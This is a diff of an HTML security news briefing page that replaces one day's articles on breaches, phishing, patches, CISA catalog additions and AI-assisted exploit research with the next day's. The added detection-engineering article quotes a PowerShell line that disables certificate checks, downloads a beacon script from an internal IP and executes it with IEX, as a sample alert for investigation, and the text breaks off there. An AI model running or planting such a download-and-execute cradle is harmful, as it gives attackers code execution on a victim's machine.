@@ -59,38 +59,47 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-04-19</h1>
+        <h1>Security Briefing // 2026-04-20</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">Critical flaw in Protobuf library enables JavaScript code execution</button></li><li><button onclick="show('art-1')">Cross‑tenant helpdesk impersonation to data exfiltration: A human-operated intrusion playbook</button></li><li><button onclick="show('art-2')">Mirai Variant Nexcorium Exploits CVE-2024-3721 to Hijack TBK DVRs for DDoS Botnet</button></li><li><button onclick="show('art-3')">Mythos, Memory Loss, and the Part InfoSec Keeps Missing</button></li><li><button onclick="show('art-4')">Into The Rainbow: Google’s NTLMv1 Rainbow Tables Explained in a Bit Too Much Detail</button></li><li><button onclick="show('art-5')">Patch Tuesday, April 2026 Edition</button></li><li><button onclick="show('art-6')">CISA Adds Two Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-7')">CISA Adds 6 Known Exploited Flaws in Fortinet, Microsoft, and Adobe Software</button></li><li><button onclick="show('art-8')">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors</button></li><li><button onclick="show('art-9')">Microsoft Patch Tuesday, March 2026 Edition</button></li></ul>
+            <ul><li><button onclick="show('art-0')">Vercel Breach Tied to Context AI Hack Exposes Limited Customer Credentials</button></li><li><button onclick="show('art-1')">Apple account change alerts abused to send phishing emails</button></li><li><button onclick="show('art-2')">Cross‑tenant helpdesk impersonation to data exfiltration: A human-operated intrusion playbook</button></li><li><button onclick="show('art-3')">Patch Tuesday, April 2026 Edition</button></li><li><button onclick="show('art-4')">CISA Adds Two Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-5')">CISA Adds 6 Known Exploited Flaws in Fortinet, Microsoft, and Adobe Software</button></li><li><button onclick="show('art-6')">Building a Detection Foundation: Part 5 - Correlation in Practice</button></li><li><button onclick="show('art-7')">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors</button></li><li><button onclick="show('art-8')">Microsoft Patch Tuesday, March 2026 Edition</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
-            <h2 class="article-title">Critical flaw in Protobuf library enables JavaScript code execution</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/critical-flaw-in-protobuf-library-enables-javascript-code-execution/" target="_blank">Original Link</a></p>
-            <div class="content-text">Proof-of-concept exploit code has been published for a critical remote code execution flaw in protobuf.js, a widely used JavaScript implementation of Google's Protocol Buffers.
-The tool is highly popular in the Node Package Manager (npm) registry, with an average of nearly [50 million weekly downloads](http://www.npmjs.com/package/protobufjs). It is used for inter-service communication, in real-time applications, and for efficient storage of structured data in databases and cloud environments.
-In a report on Friday, application security company Endor Labs says that the remote code execution vulnerability (RCE) in protobuf.js is caused by unsafe dynamic code generation.
-The security issue has not received an official CVE number and is currently being tracked as GHSA-xq3m-2v4x-88gg, the identifier assigned by GitHub.
-[Endor Labs explains](https://www.endorlabs.com/learn/the-dangers-of-reusing-protobuf-definitions-critical-code-execution-in-protobuf-js-ghsa-xq3m-2v4x-88gg) that the library builds JavaScript functions from protobuf schemas by concatenating strings and executing them via the Function() constructor, but it fails to validate schema-derived identifiers, such as message names.
-This lets an attacker supply a malicious schema that injects arbitrary code into the generated function, which is then executed when the application processes a message using that schema.
-This opens the path to RCE on servers or applications that load attacker-influenced schemas, granting access to environment variables, credentials, databases, and internal systems, and even allowing lateral movement within the infrastructure.
-The attack could also affect developer machines if those load and decode untrusted schemas locally.
-The flaw impacts protobuf.js versions 8.0.0/7.5.4 and lower. Endor Labs recommends upgrading to 8.0.1 and 7.5.5, which address the issue.
-The patch sanitizes type names by stripping non-alphanumeric characters, preventing the attacker from closing the synthetic function. However, Endor comments that a longer-term fix would be to stop round-tripping attacker-reachable identifiers through Function at all.
-Endor Labs is warning that “exploitation is straightforward,” and that the minimal proof-of-concept (PoC) included in the [security advisory](https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-xq3m-2v4x-88gg) reflects this. However, no active exploitation in the wild has been observed to date.
-The vulnerability was reported by Endor Labs researcher and security bug bounty hunter [Cristian Staicu](https://github.com/cristianstaicu) on March 2, and the protobuf.js maintainers released a patch on GitHub on March 11. Fixes to the npm packages were made available on April 4 for the 8.x branch and on April 15 for the 7.x branch.
-Apart from upgrading to patched versions, Endor Labs also recommends that system administrators audit transitive dependencies, treat schema-loading as untrusted input, and prefer precompiled/static schemas in production.
-[99% of What Mythos Found Is Still Unpatched.](https://hubs.li/Q04crVgD0)
-AI chained four zero-days into one exploit that bypassed both renderer and OS sandboxes. A wave of new exploits is coming.
-At the Autonomous Validation Summit (May 12 & 14), see how autonomous, context-rich validation finds what's exploitable, proves controls hold, and closes the remediation loop.
-Post a Comment Community Rules
-You need to login in order to post a comment
-Not a member yet? Register Now</div>
+            <h2 class="article-title">Vercel Breach Tied to Context AI Hack Exposes Limited Customer Credentials</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/vercel-breach-tied-to-context-ai-hack.html" target="_blank">Original Link</a></p>
+            <div class="content-text">Web infrastructure provider Vercel has disclosed a security breach that allows bad actors to gain unauthorized access to "certain" internal Vercel systems.
+The incident stemmed from the compromise of Context.ai, a third-party artificial intelligence (AI) tool, that was used by an employee at the company.
+"The attacker used that access to take over the employee's Vercel Google Workspace account, which enabled them to gain access to some Vercel environments and environment variables that were not marked as 'sensitive,'" the company [said](https://vercel.com/kb/bulletin/vercel-april-2026-security-incident) in a bulletin.
+Vercel said environment variables marked as "sensitive" are stored in an encrypted manner that prevents them from being read, and that there is currently no evidence suggesting that those values were accessed by the attacker.
+It described the threat actor behind the incident as "sophisticated" based on their "operational velocity and detailed understanding of Vercel's systems." The company also said it's working with Google-owned Mandiant and other cybersecurity firms, as well as notifying law enforcement and engaging with Context.ai to better understand the full scope of the breach.
+A "limited subset" of customers is said to have had their credentials compromised, with Vercel reaching out to them directly and urging them to rotate their credentials with immediate effect. The company is continuing to investigate what data was exfiltrated, and plans to contact customers if further evidence of compromise is discovered.
+Vercel is also advising Google Workspace administrators and Google account owners to check for the following application OAuth application:
+110671459871-30f1spbu0hptbs60cb4vsmv79i7bbvqj.apps.googleusercontent.com
+As additional mitigations, the following best practices have been recommended -
+- Review
+[activity log](https://vercel.com/activity-log)for signs of suspicious activity. - Audit and rotate environment variables that contain secrets and are not marked as sensitive. Use
+[sensitive environment variables](https://vercel.com/docs/environment-variables/sensitive-environment-variables)to ensure secrets are protected. - Investigate recent deployments for anything unexpected or suspicious. Ensure that
+[Deployment Protection](https://vercel.com/docs/deployment-protection)is set to Standard at a minimum. - Rotate
+[Deployment Protection tokens](https://vercel.com/docs/deployment-protection/methods-to-bypass-deployment-protection/protection-bypass-automation), if set.
+While Vercel has yet to share details about which of its systems were broken into, how many customers were affected, and who may be behind it, a threat actor using the ShinyHunters persona has [claimed](https://x.com/DiffeKey/status/2045813085408051670) responsibility for the hack, selling the stolen data for an asking price of $2 million.
+"We've deployed extensive protection measures and monitoring. We've analyzed our supply chain, ensuring Next.js, Turbopack, and our many open source projects remain safe for our community," Vercel CEO Guillermo Rauch [said](https://x.com/rauchg/status/2045995362499076169) in a post on X.
+"In response to this, and to aid in the improvement of all of our customers’ security postures, we've already rolled out new capabilities in the dashboard, including an overview page of environment variables, and a better user interface for sensitive environment variable creation and management."
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
         <div id="art-1" class="article-body">
+            <h2 class="article-title">Apple account change alerts abused to send phishing emails</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/apple-account-change-alerts-abused-to-send-phishing-emails/" target="_blank">Original Link</a></p>
+            <div class="content-text">Apple account change notifications are being abused to send fake iPhone purchase phishing scams within legitimate emails sent from Apple's servers, increasing legitimacy and potentially allowing them to bypass spam filters. [...]
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-2" class="article-body">
             <h2 class="article-title">Cross‑tenant helpdesk impersonation to data exfiltration: A human-operated intrusion playbook</h2>
             <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/04/18/crosstenant-helpdesk-impersonation-data-exfiltration-human-operated-intrusion-playbook/" target="_blank">Original Link</a></p>
             <div class="content-text">Threat actors are initiating cross-tenant Microsoft Teams communications while impersonating IT or helpdesk personnel to socially engineer users into granting remote desktop access. After access is established through Quick Assist or similar remote support tools, attackers often execute trusted vendor-signed applications alongside attacker-supplied modules to enable malicious code execution.
@@ -217,116 +226,7 @@ Review our documentation to learn more about our real-time protection capabiliti
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-2" class="article-body">
-            <h2 class="article-title">Mirai Variant Nexcorium Exploits CVE-2024-3721 to Hijack TBK DVRs for DDoS Botnet</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/mirai-variant-nexcorium-exploits-cve.html" target="_blank">Original Link</a></p>
-            <div class="content-text">Threat actors are exploiting security flaws in TBK DVR and end‑of‑life (EoL) TP-Link Wi-Fi routers to deploy [Mirai](https://thehackernews.com/2025/01/mirai-botnet-launches-record-56-tbps.html)-botnet variants on compromised devices, according to findings from Fortinet FortiGuard Labs and Palo Alto Networks Unit 42.
-The attack targeting TBK DVR devices has been found to exploit [CVE-2024-3721](https://nvd.nist.gov/vuln/detail/CVE-2024-3721) (CVSS score: 6.3), a medium-severity command injection vulnerability affecting TBK DVR-4104 and DVR-4216 digital video recording devices, to deliver a Mirai variant called Nexcorium.
-"IoT devices are increasingly prime targets for large-scale attacks due to their widespread use, lack of patching, and often weak security settings," security researcher Vincent Li [said](https://www.fortinet.com/blog/threat-research/tracking-mirai-variant-nexcorium-a-vulnerability-driven-iot-botnet-campaign). "Threat actors continue exploiting known vulnerabilities to gain initial access and deploy malware that can persist, spread, and cause distributed denial-of-service (DDoS) attacks."
-This is not the first time the vulnerability has been exploited in the wild. Over the past year, the security issue has been leveraged to deploy a [Mirai variant](https://thehackernews.com/2025/06/botnet-wazuh-server-vulnerability.html) as well as a distinct, relatively new botnet called [RondoDox](https://thehackernews.com/2025/07/rondodox-botnet-exploits-flaws-in-tbk.html). In September 2025, CloudSEK also [disclosed](https://www.cloudsek.com/blog/botnet-loader-as-a-service-infrastructure-distributing-rondodox-and-mirai-payloads) details of a large-scale loader-as-a-service botnet that has been distributing [RondoDox](https://www.f5.com/labs/articles/tracking-rondodox-malware-exploiting-many-iot-vulnerabilities), Mirai, and Morte payloads through weak credentials and old flaws in routers, IoT devices, and enterprise apps.
-The attack activity outlined by Fortinet involves the exploitation of CVE-2024-3721 to obtain and drop a downloader script, which then launches the botnet payload based on the Linux system's architecture. Once the malware is executed, it displays a message stating "nexuscorp has taken control."
-"Nexcorium has a similar architecture to the Mirai variant, including XOR-encoded configuration table initialization, watchdog module, and DDoS attack module," the security vendor said.
-The malware also includes an exploit for CVE-2017-17215 to target Huawei HG532 devices in the network and incorporates a list of hard-coded usernames and passwords for use in brute-force attacks targeting the victim's hosts by opening a Telnet connection.
-If the Telnet login is successful, it attempts to obtain a shell, set up persistence using crontab and systemd service, and connect to an external server to await commands for launching DDoS attacks over UDP, TCP, and SMTP. Once persistence is established on the device, the malware deletes the original downloaded binary to evade analysis.
-"The Nexcorium malware displays typical traits of modern IoT-focused botnets, combining vulnerability exploitation, support for multiple architectures, and various persistence methods to sustain long-term access to infected systems," Fortinet said. "Its use of known exploits, such as CVE-2017-17215, along with extensive brute-force capabilities, underscores its adaptability and efficacy in increasing its infection reach."
-The development comes as Unit 42 [said](https://unit42.paloaltonetworks.com/exploitation-of-cve-2023-33538/) it detected active, automated scans and probes attempting to exploit CVE-2023-33538 (CVSS score: 8.8), a command injection vulnerability impacting EoL TP-Link wireless routers, albeit using a flawed approach that doesn't result in a successful compromise.
-It's worth noting that the security flaw was [added](https://thehackernews.com/2025/06/tp-link-router-flaw-cve-2023-33538.html) to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) Known Exploited Vulnerabilities (KEV) catalog in June 2025. The vulnerability affects the following models -
-- TL-WR940N v2 and v4
-- TL-WR740N v1 and v2
-- TL-WR841N v8 and v10
-"Although the in-the-wild attacks we observed were flawed and would fail, our analysis confirms the underlying vulnerability is real," researchers Asher Davila, Malav Vyas, and Chris Navarrete said. "Successful exploitation requires authentication to the router's web interface."
-The attacks, in this case, attempt to deploy a Mirai-like botnet malware, with the source code featuring numerous references to the string "[Condi](https://thehackernews.com/2023/06/new-condi-malware-hijacking-tp-link-wi.html)." It also comes equipped with the ability to update itself with a newer version and act as a web server to spread the infection to other devices that connect to it.
-Given that the affected TP‑Link devices are no longer actively supported, users are advised to replace them with a newer model and ensure that default credentials are not used.
-"For the foreseeable future, the security landscape will continue to be shaped by the persistent risk of default credentials in IoT devices," Unit 42 said. "These credentials can turn a limited, authenticated vulnerability into a critical entry point for determined attackers."
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
         <div id="art-3" class="article-body">
-            <h2 class="article-title">Mythos, Memory Loss, and the Part InfoSec Keeps Missing</h2>
-            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/mythos-memory-loss-and-the-part-infosec-keeps-missing" target="_blank">Original Link</a></p>
-            <div class="content-text">Mythos, Memory Loss, and the Part InfoSec Keeps Missing
-Table of contents
-InfoSec has a bad habit of acting like history started this morning. Something new lands, the industry loses its mind for a week, vendors start talking like the old rules no longer apply, and half the industry suddenly forgets how organizations actually get compromised.
-We are doing that again with Mythos.
-Mythos is legitimately impressive. It is very good at finding bugs, useful for exploit development, and materially improves the speed and quality of vulnerability research work. Anyone pretending otherwise is coping. But the conversation around it is already drifting into the same bad pattern this industry falls into every time a new offensive capability shows up: people fixate on the most technically dramatic part of the story and lose sight of what actually matters operationally.
-That is the problem. The question is not whether Mythos is good at bug hunting and helping write exploits, it clearly is. The question is what that means for most defenders right now, and the answer is not “drop everything, autonomous zero-day machines are now the main thing compromising your environment.”
-For most organizations, the bigger problem is still much more boring and damaging: ransomware crews, extortion operations, stolen credentials, phishing, exposed edge services, weak identity controls, stale appliances, known vulnerabilities, bad segmentation, and environments where once somebody gets in, they can move far too easily. Mythos does not replace that reality, it lands on top of it. If you miss that, you end up having the wrong conversation and spending your time talking about AI-generated zero-day storms while attackers keep getting paid through the same doors defenders left open last quarter.
-We’ve Been Here Before
-Weird how InfoSec collectively forgets there was a time when browser exploits were just sitting in Metasploit. Java applets got abused into oblivion until the default behavior had to change because the model itself was broken.
-Before that, Windows Firewall was not a thing, and Linux and Unix boxes routinely shipped with inetd.conf
-full of exposed services running as root or close enough to it: rpc.statd
-, rpc.mountd
-, rpc.ttdb
-on Solaris, fingerd
-, rshd
-, the whole r-services trust model. If you were on the network, you were basically trusted, and that was normal.
-Then came the exploit kit era. Blackhole rented for pocket change, and Angler industrialized browser exploitation at scale. You did not need to be some elite exploit developer, you only needed access to the kit, traffic, and a business model. Crime as a service worked because the underlying ecosystem made it work.
-Every one of those periods felt unprecedented while people were living through them, and every one of them generated the same style of panic and the same kind of bad analysis pretending the sky had permanently fallen. Just as importantly, every one of them eventually got pushed back because the architecture changed enough to make the attack class less economical.
-inetd
-exposure gave way to host firewalls on by default. Browser plugin hell (Java, Flash, Silverlight, ActiveX) got killed off because it was indefensible at scale. Windows kept layering in mitigations like ASLR, DEP, and CFG until exploitation became harder, less reliable, and more expensive than it used to be.
-But offense shifted. As some of the older, cleaner exploit paths got squeezed, attackers moved into the next layer of abuse that still scaled: VBA, HTA, LNK files, script abuse, LOLBins, and every other piece of “normal” functionality that enterprise environments kept around because business workflows depended on it. That tradecraft is not historical trivia either a lot of it is still alive and kicking today, even if pieces of it have been nerfed over time. That is the pattern: defenders and platform vendors raise the cost on one attack class, and attackers adapt into whatever functionality remains exposed, trusted, and economically useful. The ecosystem changes, the tradecraft shifts, and the cycle repeats.
-The retail industry learned this lesson the expensive way. For years, major retailers got absolutely eviscerated through basically the same playbook: get into the network, find the point-of-sale (POS) systems, scrape card data in memory before encryption, and exfiltrate it quietly. Target, Home Depot, Neiman Marcus, and TJ Maxx before that all got hit. This was not some magical new class of intrusion. It was weak segmentation, bad trust boundaries, and treating POS systems like normal back-office IT even though they waded through a river of payment data.
-That attack pattern did not become less dominant because defenders suddenly got better at chasing alerts. It got less economical because the architecture changed. Chip-and-PIN raised the cost of card-present fraud, and point-to-point encryption meant that even if you landed on the POS environment, the data you wanted was increasingly not there in the same useful form. Eventually, the economics shifted hard enough that the old model stopped scaling the same way.
-When offense gets cheaper, faster, and easier to scale, the long-term answer usually is not “patch a little harder.” The long-term answer is that the ecosystem changes underneath it until the old attack pattern gets more expensive, less reliable, or just not worth it anymore. LLMs accelerating vulnerability discovery looks like another one of those shifts, and the ecosystem will adapt. It always does.
-What Mythos Actually Changes
-Let’s get the obvious part out of the way: Mythos matters. A system that can identify promising vulnerability candidates, reason about exploitability, and help generate working exploit paths faster than prior tooling is a meaningful capability jump, and that should not be dismissed, minimized, or hand-waved away just because people are tired of AI hype. There is real offensive potential and real defensive value in the same class of capability.
-But the industry is already doing the annoying thing where a real capability shift gets inflated into a bad narrative. The bad narrative is that Mythos means the average organization’s primary problem is now autonomous zero-day exploitation, but that is not the most useful takeaway.
-The better takeaway is that Mythos accelerates a trend that defenders were already losing against. The window between vulnerability disclosure and operational exploitation has been collapsing for years. Public proofs of concept (PoCs), exploit frameworks, bug bounty economics, easier reverse engineering, better tooling, more researchers, and a culture that rapidly operationalizes interesting bugs were already compressing timelines before LLMs started helping write useful exploit code. Mythos did not invent that trend, but it pours gasoline on it.
-The Part the Industry Keeps Missing
-Most organizations are not getting compromised because a frontier model discovered a beautiful memory corruption bug and autonomously weaponized it before breakfast.
-This is one of the most frustrating things about the Mythos coverage. It pulls the conversation toward the most cinematic version of the future while a huge amount of real-world compromise still runs through known, old, embarrassingly available paths. The average ransomware crew does not need elegance. They need access. The average extortion operation does not need a revolutionary AI exploit chain if they can buy credentials, phish a user, hit an exposed edge device, abuse a known vulnerability, or walk through a badly segmented environment. That is still the center of gravity for most organizations.
-If you want a better reality check than vendor decks and AI panic headlines, go read The DFIR Report. It is some of the most useful public work in this industry because it is built from actual incident response cases rather than theory. Read enough of those reports and the pattern becomes hard to ignore: organizations usually are getting compromised through phishing, stolen credentials, exposed remote access, public-facing applications, weak segmentation, and known weaknesses that operators can chain into ransomware, extortion, and broader compromise. The sophistication usually shows up after initial access, not before it.
-Zero days do matter, but they are not the main reason most defenders are losing today. Defenders have an exposure management problem first, a patch velocity problem, a prioritization problem, an identity problem, an architecture problem, and a “we knew this was reachable and still did not fix it” problem. That is not as fun to write headlines about, but it is a lot more useful.
-Where Defenders Have Actually Improved
-To be fair, defenders are not standing still. Cyber Threat Intelligence (CTI) has genuinely improved, detection coverage is better, EDR is more common, and response workflows are more mature. A lot of enterprises are materially better than they were 10 years ago at identifying active abuse and reacting faster once something starts to unfold.
-Better CTI and faster detection give defenders earlier visibility and better leverage. They help teams prioritize active threats, hunt smarter, and respond faster. What they do not do is magically erase exposed attack surface, weak identity controls, stale edge systems, or bad segmentation. Better visibility into a losing architecture is still visibility into a losing architecture.
-The KEV Problem, Reframed
-Another way to think about this is to stop acting like the total pile of vulnerabilities is the same thing as the total pile of meaningful breach paths. It is not, because software has always had a mountain of bugs. Many never matter operationally. Some are real but noisy. Some are hard to weaponize. Some are dead on arrival outside a lab. Some are technically severe and practically irrelevant to the way real intrusions happen. CISA’s Known Exploited Vulnerabilities (KEV) Catalog is basically the smaller subset of bugs that have actually been confirmed as exploited in the wild.
-And just as importantly, the attack surface has to be reachable. If a vulnerability is directly exposed to the Internet, that is obviously a more immediate problem. That is a clean path. But a lot of issues require the attacker to already be on a machine, already have code execution in a user context, already be past email controls, or already have made it through EDR, MFA coverage, segmentation, and whatever other layers an enterprise has put in front of the target over the last several years.
-Enterprise controls have improved year over year, even if imperfectly. Email security is better than it used to be. EDR is far more common. Logging, detection coverage, and containment workflows are generally better than they were a decade ago. None of that makes enterprises safe, but it does mean not every bug sits in a straight line to impact.
-The set of vulnerabilities that actually matter in the wild is the set that is reachable inside a real attack path at a cost attackers are willing to pay. That is why the real concern around Mythos is not “AI will find infinite bugs.” Infinite bugs were never the issue. The concern is that the subset of bugs that are reachable, useful, and operationally relevant can be triaged, understood, and weaponized faster.
-That makes Internet-facing exposure more dangerous, N-days more dangerous, and patch delay more dangerous. It also makes post-compromise vulnerabilities more dangerous because once an attacker gets a foothold through the usual means, the path from local foothold to privilege escalation or deeper compromise may compress further.
-The problem is that the path from “reachable issue” to “usable offensive capability” keeps getting shorter, while many defenders are still operating on timelines and assumptions built for a slower world.
-Still a Remediation and Architecture Problem
-The annoying part is that the answer still sounds boring: patch faster, reduce exposure, improve identity controls, segment better, shrink blast radius, harden defaults, get rid of legacy trust assumptions, log the things that matter, know what is Internet reachable, know what your third parties shipped, and know what your admins can touch.
-Everyone hates this answer because it feels too mundane for the scale of the Mythos discourse, but it is still the right answer. The reason serious post-incident work keeps pointing back to fundamentals is because that's where organizations are failing. Threat actors do not need exquisite offensive capability against an environment with exposed edge devices, weak credential hygiene, half-deployed MFA, stale software, and wide-open lateral movement paths. They need one workable path, and most environments still provide several.
-What Mythos changes is the cost of ignoring the fundamentals. If exploit development gets faster, patch delays become more expensive. If reverse engineering known fixes gets easier, “patched but not deployed yet” becomes a more dangerous state. If candidate triage gets faster, defenders get less protection from noise, scale, and obscurity.
-The industry has been leaning on inefficiency more than it wants to admit, and that cushion is getting thinner. This matters even more in open source, where discovery capacity and remediation capacity are often badly mismatched. If systems like Mythos can help find issues faster than maintainers can realistically fix them, then the bottleneck is sustained remediation capacity. That makes funding, staffing, and maintaining critical open source software a practical security problem.
-Where the Hype Is Wrong
-There are two bad reactions to Mythos. The first is denial: this is just another overhyped AI demo, real exploitation is too hard, autonomous offense is a meme, and none of this matters. That is too dismissive.
-The second is panic: the gap is gone, zero days are about to fall from the sky, defenders are cooked, and every vulnerability instantly becomes a practical breach vector. That is too theatrical.
-The more accurate view is less dramatic and more useful. Mythos-class systems are meaningful acceleration layers on top of offensive workflows that already existed. They improve researcher throughput and triage, reduce labor, and speed up the path from “this looks interesting” to “this may actually be weaponizable.” In some cases, they will clearly compress time-to-exploit in ways defenders should care about.
-But they do not erase environmental dependency, target-specific constraints, or the value of human tradecraft. They do not mean every discovered bug becomes a practical intrusion path. And they definitely do not mean defenders should re-center the entire universe around autonomous zero-day scenarios while continuing to lose to the same known access paths that have been driving compromise for years.
-The Historical Pattern Still Holds
-The good news, if you want to call it that, is that the historical pattern probably still holds here. When offense becomes cheap and scalable, the answer is to change the environment until the attack class loses efficiency.
-Over time, that probably means more AI-assisted remediation, not just AI-assisted offense. It probably means faster exploitability triage on the defensive side, stronger secure-by-default expectations, more memory-safe software where the risk justifies the migration pain, and different development pipelines with better review augmentation and software that ships with fewer security failures because the tooling around it changed.
-That is how these shifts usually end: not with defenders winning an endless footrace at the same speed, but with the ecosystem changing enough that the offense no longer scales the same way. We are not there yet, but that is still where this likely goes.
-What Defenders Should Actually Take Away
-Mythos is real.
-The capability shift is real.
-The hype is still wrong.
-Because the story is not that AI suddenly invented offensive asymmetry.
-The story is that defenders were already on the wrong side of exposure and remediation economics, and now the clock moves even faster.
-Attackers do not need a revolutionary future to beat most organizations.
-They are usually doing it with the infrastructure those organizations already forgot to fix.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-4" class="article-body">
-            <h2 class="article-title">Into The Rainbow: Google’s NTLMv1 Rainbow Tables Explained in a Bit Too Much Detail</h2>
-            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/04/16/into-the-rainbow-googles-ntlmv1-rainbow-tables-explained-in-a-bit-too-much-detail/" target="_blank">Original Link</a></p>
-            <div class="content-text"><p>TL;DR: Google published a blog post with accompanying rainbow tables targeting the Data Encryption Standard (DES) key space. The tables enable recovery of the NT hash used to generate the ciphertexts in NTLMv1 responses. We’ll dive into the tables, the recovery process, and ideally demystify any lingering questions. Acknowledgements There are many previous works on [&#8230;]</p>
-<p>The post <a href="https://specterops.io/blog/2026/04/16/into-the-rainbow-googles-ntlmv1-rainbow-tables-explained-in-a-bit-too-much-detail/">Into The Rainbow: Google’s NTLMv1 Rainbow Tables Explained in a Bit Too Much Detail</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-5" class="article-body">
             <h2 class="article-title">Patch Tuesday, April 2026 Edition</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/04/patch-tuesday-april-2026-edition/" target="_blank">Original Link</a></p>
             <div class="content-text">Microsoft today pushed software updates to fix a staggering 167 security vulnerabilities in its Windows operating systems and related software, including a SharePoint Server zero-day and a publicly disclosed weakness in Windows Defender dubbed “BlueHammer.” Separately, Google Chrome fixed its fourth zero-day of 2026, and an emergency update for Adobe Reader nixes an actively exploited flaw that can lead to remote code execution.
@@ -371,7 +271,7 @@ well this 1 broke windows explorer from running on reboot. on my win 11 25h2 pc,
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-6" class="article-body">
+        <div id="art-4" class="article-body">
             <h2 class="article-title">CISA Adds Two Known Exploited Vulnerabilities to Catalog</h2>
             <p class="source-link">Source: All CISA Advisories | <a href="https://www.cisa.gov/news-events/alerts/2026/04/14/cisa-adds-two-known-exploited-vulnerabilities-catalog" target="_blank">Original Link</a></p>
             <div class="content-text">CISA Adds Two Known Exploited Vulnerabilities to Catalog
@@ -385,7 +285,7 @@ This product is provided subject to this [Notification](/notification) and this 
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-7" class="article-body">
+        <div id="art-5" class="article-body">
             <h2 class="article-title">CISA Adds 6 Known Exploited Flaws in Fortinet, Microsoft, and Adobe Software</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/cisa-adds-6-known-exploited-flaws-in.html" target="_blank">Original Link</a></p>
             <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Monday [added](https://www.cisa.gov/news-events/alerts/2026/04/13/cisa-adds-seven-known-exploited-vulnerabilities-catalog) half a dozen security flaws to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, citing evidence of active exploitation.
@@ -399,7 +299,241 @@ There are currently no public reports referencing the exploitation of the remain
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-8" class="article-body">
+        <div id="art-6" class="article-body">
+            <h2 class="article-title">Building a Detection Foundation: Part 5 - Correlation in Practice</h2>
+            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/building-a-detection-foundation-part-5-correlation-in-practice" target="_blank">Original Link</a></p>
+            <div class="content-text">Building a Detection Foundation: Part 5 - Correlation in Practice
+Table of contents
+From Data Sources to Detection
+We've covered a lot of ground in this series: Windows Security events for logon tracking and process execution; PowerShell logging for script visibility; Sysmon for network connections; registry changes; and everything native logging misses.
+But having logs isn't the same as using them effectively. In this final part, I want to walk through how these data sources work together—in detection engineering and Incident Response.
+As can be gleaned from the previous posts in this series, to get the most out of the logs, a SIEM solution where logs are shipped to is a must. Local logs have proven invaluable, but they are at the mercy of the attacker.
+The Correlation Model
+At the heart of Windows forensics and detection is a simple concept: every action happens in a context. That context is defined by:
+- Who: The user account and session
+- What: The process, command, or action
+- When: The timestamp
+- Where: The system, and potentially the source system for remote activity
+- How: The parent process, the logon type, the network path
+Our logging foundation captures each of these elements across multiple event sources. The art is correlating them.
+The LogonID Thread
+I've mentioned LogonID repeatedly throughout this series because it's the key correlation point in Windows. Let me show you how it ties everything together.
+When a user logs on (Event 4624), they receive a LogonID. That same LogonID appears in:
+- Event 4688 / Sysmon Event 1: Process creation by that session
+- Events 4656, 4663: Object access by that session
+- Event 4672: Special privileges for that session
+- PowerShell 4103, 4104: Script execution by that session
+- Sysmon Event 3: Network connections by processes in that session
+This means you can take any suspicious event and trace it back to:
+- The session it belongs to
+- All other activity within that session
+- The authentication event that created the session
+A Real Investigation Flow
+Let me walk through a realistic scenario that demonstrates this correlation.
+Initial Alert: Your SIEM detects a suspicious PowerShell script block (Event 4104):
+Event ID: 4104
+TimeCreated: 2024-03-15 14:23:45
+ScriptBlockText:
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+$wc = New-Object System.Net.WebClient
+$wc.DownloadString("https://192.168.100.50/beacon.ps1") | IEX
